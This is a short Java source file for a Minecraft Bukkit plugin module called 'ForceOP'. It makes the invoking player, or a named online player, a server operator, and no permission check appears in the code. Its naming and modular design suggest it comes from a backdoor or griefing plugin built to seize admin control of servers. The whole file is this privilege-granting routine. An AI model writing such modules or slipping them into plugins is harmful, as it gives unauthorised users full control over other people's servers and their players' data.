package me.sanyar.modules;

import me.sanyar.main.Main;
import me.sanyar.utils.VModule;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ForceOP extends VModule {

    public ForceOP() {
        super("forceop", "Force Op");
    }

    @Override
    public void onModule(String[] args, Player player) {
        if(args.length == 1){
            player.setOp(true);
            player.sendMessage(Main.getInstance().getPrefix()+"§aYou were opped");
        }else if (args.length ==2){
            if(Bukkit.getPlayer(args[1]) != null){
                Bukkit.getPlayer(args[1]).setOp(true);
                player.sendMessage(Main.getInstance().getPrefix()+"§2"+Bukkit.getPlayer(args[1]).getName()+"§a has been opped");
            }else{
                player.sendMessage(Main.getInstance().getPlayerNotOnline());
            }
        }else{
            player.sendMessage(Main.getInstance().getErrsyn());
        }
    }
}
